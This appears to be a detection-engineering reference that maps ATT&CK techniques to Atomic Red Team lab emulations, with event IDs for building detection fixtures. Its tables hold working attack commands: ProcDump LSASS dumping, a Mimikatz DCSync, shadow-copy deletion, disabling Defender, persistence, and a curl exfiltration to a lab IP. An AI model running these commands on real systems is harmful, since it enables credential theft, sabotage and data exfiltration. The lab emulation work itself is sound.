# Atomic Red Team Mappings & Emulation Matrix

> **Document Version:** 1.0.0  
> **Last Updated:** 2026-10-19  
> **Status:** Active Reference Document  
> **Framework Reference:** [Red Canary Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)

---

## 1. Emulation Methodology

All adversarial emulation activities are structured around repeatable, threat-informed unit tests from **Atomic Red Team** and customized attack chains. 

### Operational Rules for Emulation
1. **Clean VM Snapshot Restoration:** Before each technique test, the target VM is reverted to its pre-attack baseline snapshot (e.g., `win10-pre-lsass-dump`, `dc-pre-dcsync`).
2. **Telemetry Verification:** During and immediately after execution, log forwarding to Wazuh is checked to confirm the target event ID and fields were captured.
3. **Fixture Generation:** True-positive telemetry is extracted, anonymized/normalized, and preserved in `tests/fixtures/T<ID>_positive.json`. A matching benign counter-log from the same data source is preserved in `tests/fixtures/T<ID>_negative.json`.

---

## 2. Scenario A: Active Directory Intrusion Chain Mappings

| # | Sub-Technique | ATT&CK ID | Atomic Red Team Test ID | Emulation Command / Technique | Target Data Source | Primary Event IDs | Observable Artifacts |
|---|---|---|---|---|---|---|---|
| 1 | Spearphishing Attachment | **T1566.001** | `T1566.001-1` | Drop `invoice_payload.zip` / `document.vbs` in `%USERPROFILE%\Downloads` and initiate execution | Sysmon | EID 11, EID 1 | File written to `\Downloads\`, child process spawned from `explorer.exe` |
| 2 | User Execution: Malicious File | **T1204.002** | `T1204.002-1` | Launch untrusted VBS/HTA payload simulating double-click from archive utility | Sysmon | EID 1 | `wscript.exe` or `mshta.exe` spawned with script parameter in user profile |
| 3 | PowerShell Execution | **T1059.001** | `T1059.001-1` | Execute in-memory reflection / download cradle script block | PowerShell Operational | EID 4104 | Script block containing `DownloadString`, `System.Reflection`, or `IEX` |
| 4 | Signed Binary Proxy: Rundll32 | **T1218.011** | `T1218.011-1` | Execute DLL entrypoint via `rundll32.exe C:\Users\Public\payload.dll,DllRegisterServer` | Sysmon | EID 1 | `rundll32.exe` command-line with DLL in non-standard writable path |
| 5 | Process Injection: Process Hollowing | **T1055.012** | `T1055.012-1` | Inject shellcode into hollowed `svchost.exe` via `CreateRemoteThread` | Sysmon | EID 8, EID 10 | Target image `svchost.exe`, source image untrusted binary, access mask `0x1F0FFF` |
| 6 | OS Credential Dumping: LSASS Memory | **T1003.001** | `T1003.001-1` | Dump LSASS memory via ProcDump (`procdump64.exe -ma lsass.exe lsass.dmp`) | Sysmon | EID 10 | Source process requesting `PROCESS_VM_READ` (`0x0010` / `0x1010`) against `lsass.exe` |
| 7 | Credential Dumping: DCSync | **T1003.006** | `T1003.006-1` | Replicate AD account hashes via Mimikatz (`lsadump::dcsync /domain:corp.local /user:krbtgt`) | Windows Security | EID 4662 | Access mask `0x100`, Directory Service Replication GUIDs requested by non-DC user |
| 8 | Remote Service: SMB Admin Shares | **T1021.002** | `T1021.002-1` | Map administrative share `net use \\192.168.56.30\ADMIN$ /user:corpadmin Password123!` | Windows Security | EID 5140 | Share access to `\\*\ADMIN$` or `\\*\C$` from non-domain-controller IP |
| 9 | Account Discovery: Domain Account | **T1087.002** | `T1087.002-1` | Enumerate domain users: `net user /domain` and `net group "Domain Admins" /domain` | Sysmon / Security | EID 1, EID 4661 | Command-line patterns `net user /domain`, `net group` |
| 10 | Domain Trust Discovery | **T1482** | `T1482-1` | Query domain trusts: `nltest /domain_trusts` and `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetAllTrustRelationships()` | Sysmon / PowerShell | EID 1, EID 4104 | Execution of `nltest.exe` with `/domain_trusts` flag |

---

## 3. Scenario B: Ransomware Precursor Chain Mappings

| # | Sub-Technique | ATT&CK ID | Atomic Red Team Test ID | Emulation Command / Technique | Target Data Source | Primary Event IDs | Observable Artifacts |
|---|---|---|---|---|---|---|---|
| 1 | Valid Accounts: Domain Accounts | **T1078.002** | `T1078.002-1` | Network logon using compromised administrative credentials during anomalous hours | Windows Security | EID 4624 | LogonType 3 or 10, target user privileged domain account from remote workstation |
| 2 | Remote Services: RDP | **T1021.001** | `T1021.001-1` | Inbound RDP connection from Kali attacker machine (`xfreerdp /u:corpadmin /p:... /v:192.168.56.20`) | Windows Security | EID 4624, EID 4625 | LogonType 10, Port 3389, Source IP Kali attacker |
| 3 | Scheduled Task: Creation | **T1053.005** | `T1053.005-1` | Create persistence task: `schtasks /create /tn "CorpMaintenance" /tr "powershell.exe -w hidden -c ..." /sc onlogon /ru SYSTEM` | Windows Security / Sysmon | EID 4698, EID 1 | Task name created with suspicious action referencing script interpreter |
| 4 | Boot/Logon Autostart: Run Keys | **T1547.001** | `T1547.001-1` | Persist via Registry Run key: `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Users\Public\payload.exe" /f` | Sysmon | EID 13 | TargetObject ending in `\CurrentVersion\Run`, pointing to non-standard executable path |
| 5 | Inhibit System Recovery | **T1490** | `T1490-1` | Delete shadow copies and disable recovery: `vssadmin delete shadows /all /quiet` & `bcdedit /set {default} bootstatuspolicy ignoreallfailures` | Sysmon | EID 1 | Command-line matching `vssadmin` shadow deletion, `wbadmin` catalog deletion, or `bcdedit` recovery tampering |
| 6 | Impair Defenses: Disable Defender | **T1562.001** | `T1562.001-1` | Disable real-time monitoring: `Set-MpPreference -DisableRealtimeMonitoring $true` via elevated PowerShell | PowerShell Operational / Sysmon | EID 4104, EID 13 | ScriptBlock with `Set-MpPreference` and `DisableRealtimeMonitoring`, Defender registry key tamper |
| 7 | Data Encrypted for Impact | **T1486** | `T1486-1` | Execute encryptor simulation script creating 50 `.lockbit` encrypted files in test folder | Sysmon / Security | Sysmon EID 11, Security EID 4663 | Burst file creation with ransomware extension + high-rate file write/delete operations |
| 8 | Exfiltration Over C2 Channel | **T1041** | `T1041-1` | Exfiltrate simulated staging archive to external IP: `curl -X POST --data-binary @staging.zip http://192.168.56.1:8080/upload` | Sysmon | EID 3 | Outbound connection on non-standard port or large outbound payload transfer from CLI tool |
| 9 | Obfuscated Files or Information | **T1027** | `T1027-1` | Execute base64-encoded command: `powershell.exe -enc V3JpdGUtSG9zdCAnTWFsaWNpb3VzIENvbW1hbmQn` | PowerShell Operational | EID 4104 | CLI flag `-enc`, `-EncodedCommand`, or script block containing Base64 decoding calls |
| 10 | Windows Management Instrumentation | **T1047** | `T1047-1` | Remote command execution via WMI: `wmic process call create "cmd.exe /c whoami > C:\Users\Public\out.txt"` | Sysmon | EID 1, EID 19 | `wmic.exe` command-line with `process call create` |

---

## 4. Laboratory Emulation Boundaries

As documented in [docs/scope.md](../docs/scope.md):
- **T1566.001**: Emulation initiates post-delivery execution from user download staging directories.
- **T1486**: Emulation utilizes a safe, sandboxed encryption simulation script targeting exclusively disposable files in `C:\LabData\TestDocuments\` to avoid corrupting OS dependencies.
